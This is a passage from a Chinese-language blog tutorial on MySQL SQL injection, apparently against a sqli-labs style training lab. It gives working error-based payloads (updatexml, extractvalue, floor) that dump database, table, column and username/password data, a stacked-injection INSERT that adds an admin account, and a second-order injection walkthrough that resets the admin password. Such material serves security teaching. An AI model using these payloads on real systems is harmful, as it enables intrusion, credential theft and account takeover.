data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">&lt;</span>root<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token operator\">&lt;</span>message<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token operator\">&lt;</span>sender<span class=\"token operator\">></span>Tom<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>sender<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token operator\">&lt;</span>receiver<span class=\"token operator\">></span>Kate<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>receiver<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token operator\">&lt;</span>content<span class=\"token operator\">></span>Hello<span class=\"token punctuation\">,</span> how are you?<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>content<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>message<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>root<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>我们可以使用UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数来替换节点的值，比如将消息内容的值替换为新的内容：</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">UPDATE</span> messages</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">SET</span> msg <span class=\"token operator\">=</span> UPDATEXML<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> <span class=\"token string\">'/root/message/content'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'I am fine, thank you.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>上面的语句将会把表中id为<span class=\"token number\">1</span>的记录的content节点的值修改为<span class=\"token string\">\"I am fine, thank you.\"</span>。</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">--xpath 语法错误</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>extractvalue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">-- 查询节点内容</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>updatexml<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">-- 修改查询到的内容</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>它们的第二个参数都要求是符合xpath语法的字符串</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>如果不满足要求则会报错，并且将查询结果放在报错信息里</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">-- 主键重复（duplicate entry）</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>floor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t\t<span class=\"token comment\">-- 返回小于等于该值的最大整数</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>只要是count，rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，<span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> 三个连用就会造成这种主键重复报错</pre></td></tr></table></figure><h4 id=\"爆数据库\"><a class=\"markdownIt-Anchor\" href=\"#爆数据库\">#</a> 爆数据库</h4>\n<p>?id=1’%20 and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9689.png\" alt=\"\"></p>\n<p>–0x7e 是 &quot;~&quot; 符号的 16 进制，在这作为分隔符</p>\n<h4 id=\"爆表\"><a class=\"markdownIt-Anchor\" href=\"#爆表\">#</a> 爆表</h4>\n<p>?id=1’%20 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=“security”),0x7e),1)–+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/tyuk.png\" alt=\"\"></p>\n<h4 id=\"爆字段\"><a class=\"markdownIt-Anchor\" href=\"#爆字段\">#</a> 爆字段</h4>\n<p>?id=1’%20 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=“security” and table_name=“users” limit 1,1),0x7e),1) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/sdgfbsre.png\" alt=\"\"></p>\n<h4 id=\"爆数据\"><a class=\"markdownIt-Anchor\" href=\"#爆数据\">#</a> 爆数据</h4>\n<p>?id=1’%20 and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 4,1),0x7e),1) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/dthsrhtrs.png\" alt=\"\"></p>\n<h4 id=\"extractvalue函数用法\"><a class=\"markdownIt-Anchor\" href=\"#extractvalue函数用法\">#</a> –extractvalue 函数用法</h4>\n<p>?id=1’%20 and extractvalue(1,concat(0x7e,(select database()),0x7e))–+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/shrthrthrhthe.png\" alt=\"\"></p>\n<p>–floor()</p>\n<p>?id=1’%20 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/989898.png\" alt=\"\"></p>\n<h3 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h3>\n<p>堆叠查询：堆叠查询可以执行多条 SQL 语句，语句之间以分号 (;) 隔开，而堆叠查询注入攻击就是利用此特 点，在第二条语句中构造要执行攻击的语句。 在 mysql 里 mysqli_multi_query 和 mysql_multi_query 这两个函数执行一个或多个针对数据库的查询。多个查询用分号；进行分隔。</p>\n<p>但是堆叠查询只能返回第一条查询信息，不返回后面的信息。 select version ();select database () 堆叠注入的危害是很大的 可以任意使用增删改查的语句，例如删除数据库 修改数据库，添加数据库用户</p>\n<p>-1’ union select 1,2,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()  limit 1)  %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/0808.png\" alt=\"\"></p>\n<p>把库里所有的表获取出来，再获取字段 -1’ union select 1,2,(select group_concat (column_name) from information_schema.columns where TABLE_NAME=‘users’ limit 1)  %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/656565e.png\" alt=\"\"></p>\n<p>知道表的列的情况下使用 insert into 插入语句进行增加账号。如果是管理表 直接添加管理员账号即可 登录后台</p>\n<p>id=-999’;insert into users (id,username,password) values (1000,‘admin999’,‘123456’)–+ 访问 1000 即可访问到刚刚添加的账号</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/6666e.png\" alt=\"\"></p>\n<h3 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> 二次注入</h3>\n<p>二次注入漏洞是一种在 Web 应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏 洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。 二次注入原理 二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助</p>\n<p>get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是 addslashes 有一个特点就是虽然参数在过滤 后会添加 “\\” 进行转义，但是 “\\” 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数 据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接 从数据库中取出了脏数据，没有进行下一步的检验和处理，这样就会造成 SQL 的二次注入。比如在第一次 插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就 形成了二次注入.</p>\n<p>二次注入图解</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci1.png\" alt=\"\"></p>\n<p>现在密码是 admin 999999</p>\n<p>修改密码页面</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci2.png\" alt=\"\"></p>\n<p>注册 admin’#</p>\n<p>登陆进去</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci3.png\" alt=\"\"></p>\n<p>修改密码</p>\n<p>修改的是 admin 的密码</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci4e.png\" alt=\"\"></p>\n<p>登陆 admin 账户输入刚才更改的密码成功登陆</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci5.png\" alt=\"\"></p>\n",
            "tags": []
        }
    ]
}